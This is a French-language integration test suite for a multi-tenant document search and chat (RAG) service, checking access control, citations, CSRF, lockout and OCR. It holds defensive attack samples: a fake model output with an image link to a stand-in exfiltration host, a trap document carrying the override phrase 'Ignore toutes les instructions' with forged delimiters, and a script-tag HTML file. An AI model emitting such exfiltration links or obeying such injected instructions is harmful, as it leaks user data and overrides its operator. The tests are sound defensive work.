"""Scénarios de la phase 1 sur la pile réelle (PostgreSQL, Qdrant) avec un encodeur et un
modèle de génération déterministes. Couvre les scénarios de recette 1, 2, 3, 5, 6 et les
règles de sécurité de docs/SECURITY.md."""

from __future__ import annotations

import os
import time
import uuid

import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine, text
from urag_api.cli import bootstrap
from urag_api.main import create_app
from urag_core.ai import ChatResult, ModelRouter, ModelSpec
from urag_core.embeddings import HashingEncoder
from urag_worker.main import Worker

from tests.fixtures.documents import build_corpus, write_blank_pdf
from tests.integration.conftest import login, make_state, sse_events

pytestmark = pytest.mark.integration
PASSWORD = "mot de passe de test 2026"


class ScriptedAdapter:
    """Modèle factice : cite l'extrait [1], et une référence inexistante [9] qui doit être retirée."""

    def __init__(self) -> None:
        self.last_messages = None

    def health(self):
        return True

    def chat(self, model, messages, result: ChatResult):
        self.last_messages = messages
        result.tokens_in, result.tokens_out = 100, 20
        yield "Le loyer mensuel est de 450 000 FCFA [1]. "
        yield "Voir aussi ![x](https://exfiltration.example/?d=1) [9]."


@pytest.fixture(scope="module")
def env(database, tmp_path_factory):
    tmp = tmp_path_factory.mktemp("phase1")
    corpus = build_corpus(tmp / "corpus")
    adapter = ScriptedAdapter()
    router = ModelRouter({"fake": adapter}, [ModelSpec("local-fake", "modele-test", "fake", "local")])
    state = make_state(database, tmp, HashingEncoder(256), router)
    client = TestClient(create_app(state))
    a = bootstrap(
        database["admin_url"],
        "Banque A",
        f"banque-a-{uuid.uuid4().hex[:6]}",
        f"admin.a.{uuid.uuid4().hex[:6]}",
        PASSWORD,
        "Admin A",
    )
    b = bootstrap(
        database["admin_url"],
        "Assurance B",
        f"assurance-b-{uuid.uuid4().hex[:6]}",
        f"admin.b.{uuid.uuid4().hex[:6]}",
        PASSWORD,
        "Admin B",
    )
    with create_engine(database["admin_url"]).connect() as c:
        logins = dict(
            c.execute(
                text("SELECT org_id, login FROM users WHERE id IN (:a, :b)"), {"a": a["user_id"], "b": b["user_id"]}
            ).all()
        )
    admin_a = login(client, logins[a["org_id"]], PASSWORD)
    admin_b = login(client, logins[b["org_id"]], PASSWORD)
    suffix = uuid.uuid4().hex[:6]
    users = {}
    for name, roles in (("bob", ["user"]), ("carol", ["user"])):
        r = client.post(
            "/api/v1/users",
            headers=admin_a,
            json={"login": f"{name}.{suffix}", "display_name": name, "password": PASSWORD, "roles": roles},
        )
        assert r.status_code == 201, r.text
        users[name] = (r.json()["id"], login(client, f"{name}.{suffix}", PASSWORD))
    space = client.post("/api/v1/spaces", headers=admin_a, json={"name": "Juridique"}).json()["id"]
    r = client.put(
        f"/api/v1/spaces/{space}/grants",
        headers=admin_a,
        json=[{"principal_type": "user", "principal_id": users["bob"][0]}],
    )
    assert r.status_code == 200, r.text
    source = client.post(
        "/api/v1/sources",
        headers=admin_a,
        json={
            "kind": "local_files",
            "name": "Partage juridique",
            "space_id": space,
            "config": {"roots": [str(corpus)]},
            "inherit_space_access": True,
        },
    ).json()["id"]
    worker = Worker(state.db, state.ingestion)
    return {
        "client": client,
        "state": state,
        "worker": worker,
        "corpus": corpus,
        "admin_a": admin_a,
        "admin_b": admin_b,
        "bob": users["bob"][1],
        "carol": users["carol"][1],
        "bob_id": users["bob"][0],
        "space": space,
        "source": source,
        "adapter": adapter,
        "tmp": tmp,
    }


def sync(env) -> None:
    r = env["client"].post(f"/api/v1/sources/{env['source']}/sync", headers=env["admin_a"])
    assert r.status_code == 202, r.text
    env["worker"].run_until_idle()


def search(env, who: str, query: str) -> list[dict]:
    r = env["client"].post("/api/v1/search", headers=env[who], json={"query": query})
    assert r.status_code == 200, r.text
    return r.json()["items"]


# ---------------------------------------------------------------- scénarios 1, 2, 3


def test_01_ajout_source_et_indexation_pdf_word(env):
    assert env["client"].post(f"/api/v1/sources/{env['source']}/test", headers=env["admin_a"]).json()["ok"]
    sync(env)
    docs = {d["filename"]: d for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]}
    assert set(docs) == {"contrat_bail_alpha.pdf", "note_rh.docx", "procedure_archivage.txt", "note_piegee.txt"}
    assert all(d["status"] == "indexed" for d in docs.values()), docs
    assert docs["contrat_bail_alpha.pdf"]["chunk_count"] >= 1 and docs["note_rh.docx"]["chunk_count"] >= 2
    jobs = env["client"].get("/api/v1/admin/jobs", headers=env["admin_a"]).json()["items"]
    assert jobs and all(j["status"] == "succeeded" for j in jobs)


def test_02_resynchronisation_idempotente(env):
    before = env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]
    sync(env)
    after = env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]
    assert len(before) == len(after)
    jobs = env["client"].get("/api/v1/admin/jobs", headers=env["admin_a"]).json()["items"]
    assert sum(j["kind"] == "ingest_document" for j in jobs) == 4  # aucune réindexation inutile


# ---------------------------------------------------------------- recherche et droits


def test_03_recherche_pages_et_reference_exacte(env):
    hits = search(env, "bob", "loyer mensuel du bail")
    assert hits and hits[0]["title"] == "contrat_bail_alpha" and hits[0]["pages"] == "page 2"
    exact = search(env, "bob", "CTR-2024-0153")
    assert exact[0]["title"] == "contrat_bail_alpha" and "lexical" in exact[0]["channels"]
    word = search(env, "bob", "jours de congés payés")
    assert any(h["title"] == "note_rh" and "Congés annuels" in h["section"] for h in word)


def test_04_utilisateur_sans_droit_ne_voit_rien(env):
    assert search(env, "carol", "loyer mensuel du bail") == []
    assert search(env, "carol", "CTR-2024-0153") == []


def test_05_aucune_fuite_entre_organisations(env):
    assert search(env, "admin_b", "loyer mensuel du bail") == []
    r = env["client"].post(f"/api/v1/sources/{env['source']}/sync", headers=env["admin_b"])
    assert r.status_code == 404
    assert env["client"].get("/api/v1/documents", headers=env["admin_b"]).json()["items"] == []


# ---------------------------------------------------------------- scénarios 5 et 6 : réponse sourcée


def test_06_reponse_sourcee_citations_validees(env):
    r = env["client"].post("/api/v1/chat", headers=env["bob"], json={"question": "Quel est le loyer mensuel ?"})
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/event-stream")
    events = sse_events(r.text)
    names = [e[0] for e in events]
    assert names[0] == "meta" and names[-1] == "done" and "citations" in names
    meta = events[0][1]
    assert meta["model"]["locality"] == "local"
    citations = next(d for n, d in events if n == "citations")["items"]
    # Le modèle factice cite [1] pour « 450 000 FCFA » et invente [9]. [9] est retiré ; [1] est conservé
    # seulement si l'extrait n°1 contient bien ce montant, sinon la citation est redirigée vers l'extrait
    # qui le contient (citation déduite). Dans tous les cas, la citation finale justifie la phrase.
    assert len(citations) == 1
    cite = citations[0]
    assert cite["title"] == "contrat_bail_alpha" and cite["pages"] == "page 2" and "450 000" in cite["excerpt"]
    context = env["adapter"].last_messages[1].content
    rank_line = next(line for line in context.splitlines() if line.startswith(f"[{cite['rank']}] "))
    assert rank_line.startswith(f"[{cite['rank']}] contrat_bail_alpha — Partage juridique")
    done = events[-1][1]
    assert done["removed_citations"] >= 1 and "exfiltration" not in done["answer"]
    # Le contexte envoyé au modèle ne contient que des passages autorisés, encadrés comme données.
    assert "<<<EXTRAIT" in context and "EXTRAIT>>>" in context
    convs = env["client"].get("/api/v1/conversations", headers=env["bob"]).json()["items"]
    detail = env["client"].get(f"/api/v1/conversations/{convs[0]['id']}", headers=env["bob"]).json()
    assert [m["role"] for m in detail["messages"]] == ["user", "assistant"]
    assert detail["messages"][1]["citations"][0]["accessible"] is True
    env["conversation"] = convs[0]["id"]


def test_07_conversation_d_autrui_introuvable(env):
    cid = env["conversation"]
    assert env["client"].get(f"/api/v1/conversations/{cid}", headers=env["carol"]).status_code == 404
    r = env["client"].post("/api/v1/chat", headers=env["carol"], json={"question": "x", "conversation_id": cid})
    assert r.status_code == 404


def test_08_sans_passage_autorise_pas_d_appel_au_modele(env):
    env["adapter"].last_messages = None
    events = sse_events(
        env["client"].post("/api/v1/chat", headers=env["carol"], json={"question": "Quel est le loyer mensuel ?"}).text
    )
    assert events[-1][1]["insufficient"] is True
    assert env["adapter"].last_messages is None  # aucun extrait : le modèle n'est même pas appelé


def test_09_document_piege_traite_comme_donnee(env):
    hits = search(env, "bob", "parking réservé visiteurs")
    assert hits[0]["title"] == "note_piegee"
    assert hits[0]["suspect"] and "ignorer les instructions" in hits[0]["suspect"]  # signalé dans la recherche
    env["adapter"].last_messages = None
    r = env["client"].post("/api/v1/chat", headers=env["bob"], json={"question": "Qui peut utiliser le parking ?"})
    done = sse_events(r.text)[-1][1]
    assert done["passages_suspects_ecartes"] >= 1
    if env["adapter"].last_messages is None:  # aucun autre passage : le modèle n'est pas appelé
        return
    context = env["adapter"].last_messages[1].content
    assert "Ignore toutes les instructions" not in context  # jamais envoyé au modèle
    assert context.count("<<<EXTRAIT") == context.count("EXTRAIT>>>")  # délimiteurs du document neutralisés
    assert "faux EXTRAIT>>>" not in context


# ---------------------------------------------------------------- versions, suppressions, révocations


def test_10_document_modifie_ancienne_version_invisible(env):
    path = env["corpus"] / "procedure_archivage.txt"
    path.write_text(
        "Procédure d'archivage révisée\n\nLa durée de conservation des dossiers de crédit est désormais de 15 ans.",
        encoding="utf-8",
    )
    os.utime(path, (time.time() + 5, time.time() + 5))
    sync(env)
    hits = [
        h
        for h in search(env, "bob", "durée de conservation des dossiers de crédit")
        if h["title"].startswith("procedure_archivage")
    ]
    texts = " ".join(h["excerpt"] for h in hits)
    assert "15 ans" in texts and "10 ans" not in texts  # l'ancienne version ne ressort plus


def test_11_document_supprime_ne_ressort_plus(env):
    (env["corpus"] / "note_rh.docx").unlink()
    sync(env)
    assert all(h["title"] != "note_rh" for h in search(env, "bob", "jours de congés payés"))
    names = {d["filename"] for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]}
    assert "note_rh.docx" not in names


def test_12_document_scanne_signale(env):
    write_blank_pdf(env["corpus"] / "scan_facture.pdf")
    sync(env)
    docs = {d["filename"]: d for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]}
    assert docs["scan_facture.pdf"]["status"] == "failed" and "OCR" in docs["scan_facture.pdf"]["status_detail"]


def test_13_revocation_immediate(env):
    r = env["client"].put(f"/api/v1/spaces/{env['space']}/grants", headers=env["admin_a"], json=[])
    assert r.status_code == 200
    assert search(env, "bob", "loyer mensuel du bail") == []
    detail = env["client"].get(f"/api/v1/conversations/{env['conversation']}", headers=env["bob"]).json()
    cite = detail["messages"][1]["citations"][0]
    assert cite["accessible"] is False and cite["excerpt"] is None  # extrait masqué après révocation
    env["client"].put(
        f"/api/v1/spaces/{env['space']}/grants",
        headers=env["admin_a"],
        json=[{"principal_type": "user", "principal_id": env["bob_id"]}],
    )
    assert search(env, "bob", "loyer mensuel du bail")


def test_14_dossier_ferme_par_defaut(env):
    other = env["tmp"] / "corpus_ferme"
    other.mkdir()
    (other / "budget.txt").write_text("Budget confidentiel 2027 : 3 milliards FCFA.", encoding="utf-8")
    source = (
        env["client"]
        .post(
            "/api/v1/sources",
            headers=env["admin_a"],
            json={
                "kind": "local_files",
                "name": "Finances",
                "space_id": env["space"],
                "config": {"roots": [str(other)]},
            },
        )
        .json()["id"]
    )  # inherit_space_access non précisé
    env["client"].post(f"/api/v1/sources/{source}/sync", headers=env["admin_a"])
    env["worker"].run_until_idle()
    assert all(h["title"] != "budget" for h in search(env, "bob", "budget confidentiel 2027"))
    assert all(h["title"] != "budget" for h in search(env, "admin_a", "budget confidentiel 2027"))
    docs = {d["filename"]: d for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]}
    assert docs["budget.txt"]["status"] == "indexed" and docs["budget.txt"]["access_key_count"] == 0


# ---------------------------------------------------------------- authentification et rôles


def test_15_roles(env):
    c = env["client"]
    assert (
        c.post(
            "/api/v1/sources",
            headers=env["bob"],
            json={"kind": "local_files", "name": "x", "space_id": env["space"], "config": {"roots": ["/"]}},
        ).status_code
        == 403
    )
    assert c.get("/api/v1/users", headers=env["bob"]).status_code == 403
    assert (
        c.post(
            "/api/v1/users", headers=env["bob"], json={"login": "x.y", "display_name": "x", "password": PASSWORD}
        ).status_code
        == 403
    )
    assert TestClient(create_app(env["state"])).get("/api/v1/documents").status_code == 401
    r = c.post(
        "/api/v1/sources",
        headers=env["admin_a"],
        json={"kind": "local_files", "name": "x", "space_id": env["space"], "config": {"password": "abc"}},
    )
    assert r.status_code == 422


def test_16_cookies_csrf_rotation_et_reutilisation(database, env):
    from fastapi.testclient import TestClient
    from urag_api.main import create_app

    client = TestClient(create_app(env["state"]))
    me = env["client"].get("/api/v1/auth/me", headers=env["bob"]).json()
    r = client.post("/api/v1/auth/login", json={"login": me["login"], "password": PASSWORD})
    assert r.status_code == 200 and "urag_access" in r.cookies
    csrf = r.json()["csrf_token"]
    assert client.get("/api/v1/auth/me").status_code == 200
    body = {"query": "loyer"}
    assert client.post("/api/v1/search", json=body).status_code == 403  # cookie sans jeton anti-CSRF
    assert client.post("/api/v1/search", json=body, headers={"X-CSRF-Token": csrf}).status_code == 200
    old_refresh = r.json()["refresh_token"]
    r2 = client.post("/api/v1/auth/refresh", json={"refresh_token": old_refresh})
    assert r2.status_code == 200
    reuse = client.post("/api/v1/auth/refresh", json={"refresh_token": old_refresh})
    assert reuse.status_code == 401  # réutilisation détectée
    assert client.post("/api/v1/auth/refresh", json={"refresh_token": r2.json()["refresh_token"]}).status_code == 401


def test_17_verrouillage_apres_echecs(env):
    c = env["client"]
    login_name = f"dave.{uuid.uuid4().hex[:6]}"
    c.post(
        "/api/v1/users", headers=env["admin_a"], json={"login": login_name, "display_name": "d", "password": PASSWORD}
    )
    codes = [
        c.post("/api/v1/auth/login", json={"login": login_name, "password": "faux mot de passe x"}).status_code
        for _ in range(5)
    ]
    assert codes == [401] * 5
    assert c.post("/api/v1/auth/login", json={"login": login_name, "password": PASSWORD}).status_code == 423
    unknown = c.post("/api/v1/auth/login", json={"login": "inconnu.total", "password": "x"})
    assert unknown.status_code == 401 and unknown.json()["code"] == "auth.invalid"


def test_18_audit_sans_contenu_documentaire(env, database):
    with create_engine(database["admin_url"]).connect() as c:
        rows = c.execute(text("SELECT action, details::text FROM audit_log")).all()
    actions = {r.action for r in rows}
    assert {"auth.login", "source.create", "source.sync", "ai.query", "search.query"} <= actions
    questions = [r.details for r in rows if r.action == "ai.query"]
    assert any("loyer" in q for q in questions)  # décision Q5 : texte des questions journalisé
    assert not any("450 000" in r.details for r in rows)  # jamais le contenu des documents


def test_19_pdf_scanne_lu_par_ocr_et_recherchable(env):
    from tests.fixtures.documents import write_scanned_pdf

    write_scanned_pdf(env["corpus"] / "avis_capital_paiement.pdf")
    sync(env)
    docs = {d["filename"]: d for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]}
    assert docs["avis_capital_paiement.pdf"]["status"] == "indexed"
    hits = search(env, "bob", "capital social minimum des établissements de paiement")
    assert hits[0]["title"] == "avis_capital_paiement" and "250 millions" in hits[0]["excerpt"]
    assert hits[0]["pages"] == "page 1"


def test_20_activation_de_l_ocr_relit_les_pages_scannees(env):
    from urag_core.ingestion import IngestionService
    from urag_worker.main import Worker

    from tests.fixtures.documents import write_mixed_pdf

    write_mixed_pdf(env["corpus"] / "rapport_avec_annexe.pdf")
    st = env["state"]
    sans_ocr = Worker(st.db, IngestionService(st.db, st.vectors, st.encoder, st.settings.tmp_dir, ocr=None))
    env["client"].post(f"/api/v1/sources/{env['source']}/sync", headers=env["admin_a"])
    sans_ocr.run_until_idle()
    doc = next(
        d
        for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]
        if d["filename"] == "rapport_avec_annexe.pdf"
    )
    assert doc["status"] == "indexed_with_warning"  # page 2 non lue
    before = search(env, "bob", "établissements de paiement 250 millions")
    assert not any(h["title"] == "rapport_avec_annexe" and "250 millions" in h["excerpt"] for h in before)
    sync(env)  # worker avec OCR : le document inchangé est repris pour lire la page scannée
    doc = next(
        d
        for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]
        if d["filename"] == "rapport_avec_annexe.pdf"
    )
    assert doc["status"] == "indexed"
    after = search(env, "bob", "établissements de paiement 250 millions")
    scanned = [h for h in after if h["title"] == "rapport_avec_annexe" and "250 millions" in h["excerpt"]]
    assert scanned and scanned[0]["pages"] == "page 2"


def test_21_reprise_apres_interruption_du_worker(env):
    """Scénario 16 : un worker s'arrête en pleine tâche ; la tâche est reprise, sans doublon."""
    from sqlalchemy import text as sql
    from urag_core.jobs import requeue_stale, take

    (env["corpus"] / "note_reprise.txt").write_text(
        "Note sur la reprise : le comité se réunit le jeudi.", encoding="utf-8"
    )
    env["client"].post(f"/api/v1/sources/{env['source']}/sync", headers=env["admin_a"])
    st = env["state"]
    # Un premier worker prend la synchronisation puis « meurt » sans la terminer.
    with st.db.anonymous() as conn:
        orgs = conn.execute(sql("SELECT * FROM urag_orgs_with_ready_jobs()")).scalars().all()
    org_id = orgs[0]
    with st.db.org(org_id) as conn:
        job = take(conn, "worker-mort")
        assert job is not None and job.kind == "sync_source"
        conn.execute(sql("UPDATE jobs SET heartbeat_at = now() - interval '1 hour' WHERE id = :i"), {"i": job.id})
    env["worker"].run_until_idle()  # rien à faire : la tâche est « en cours » chez le worker mort
    with st.db.org(org_id) as conn:
        assert conn.execute(sql("SELECT status::text FROM jobs WHERE id = :i"), {"i": job.id}).scalar_one() == "running"
        assert requeue_stale(conn, stale_after_seconds=600) == 1  # détectée et remise en file
    env["worker"].run_until_idle()
    docs = [
        d
        for d in env["client"].get("/api/v1/documents", headers=env["admin_a"]).json()["items"]
        if d["filename"] == "note_reprise.txt"
    ]
    assert len(docs) == 1 and docs[0]["status"] == "indexed"  # indexé une seule fois
    assert any(h["title"] == "note_reprise" for h in search(env, "bob", "jour de réunion du comité"))


def test_22_ouvrir_le_document_original(env, database):
    """Scénario 7 : ouvrir le document cité, avec revérification des droits."""
    hit = search(env, "bob", "loyer mensuel du bail")[0]
    url = f"/api/v1/documents/{hit['document_id']}/open"
    r = env["client"].get(url, headers=env["bob"])
    assert r.status_code == 200, r.text
    original = next(p for p in env["corpus"].rglob("*") if p.is_file() and p.stem == hit["title"])
    assert r.content == original.read_bytes()  # le fichier de la source, tel quel
    assert r.headers["content-type"].startswith("application/pdf")
    assert r.headers["content-disposition"].startswith("inline")
    assert r.headers["content-security-policy"].startswith("sandbox")
    assert r.headers["cache-control"] == "no-store"
    # Sans droit, autre organisation ou identifiant inconnu : même réponse, rien n'est révélé.
    assert env["client"].get(url, headers=env["carol"]).status_code == 404
    assert env["client"].get(url, headers=env["admin_b"]).status_code == 404
    assert env["client"].get(f"/api/v1/documents/{uuid.uuid4()}/open", headers=env["bob"]).status_code == 404
    with create_engine(database["admin_url"]).connect() as c:
        actions = [
            r.action
            for r in c.execute(text("SELECT action FROM audit_log WHERE target_id = :d"), {"d": hit["document_id"]})
        ]
    assert "document.open" in actions and "document.open_denied" in actions


def test_23_document_actif_propose_au_telechargement(env):
    """Un fichier HTML n'est jamais affiché dans le navigateur depuis l'API (pas de script exécuté)."""
    (env["corpus"] / "page_intranet.html").write_text(
        "<html><body><p>Le guichet ferme à 16 heures.</p><script>alert(1)</script></body></html>", encoding="utf-8"
    )
    sync(env)
    hit = next(h for h in search(env, "bob", "heure de fermeture du guichet") if h["title"] == "page_intranet")
    r = env["client"].get(f"/api/v1/documents/{hit['document_id']}/open", headers=env["bob"])
    assert r.status_code == 200
    assert r.headers["content-disposition"].startswith("attachment")
    assert r.headers["content-security-policy"].startswith("sandbox")
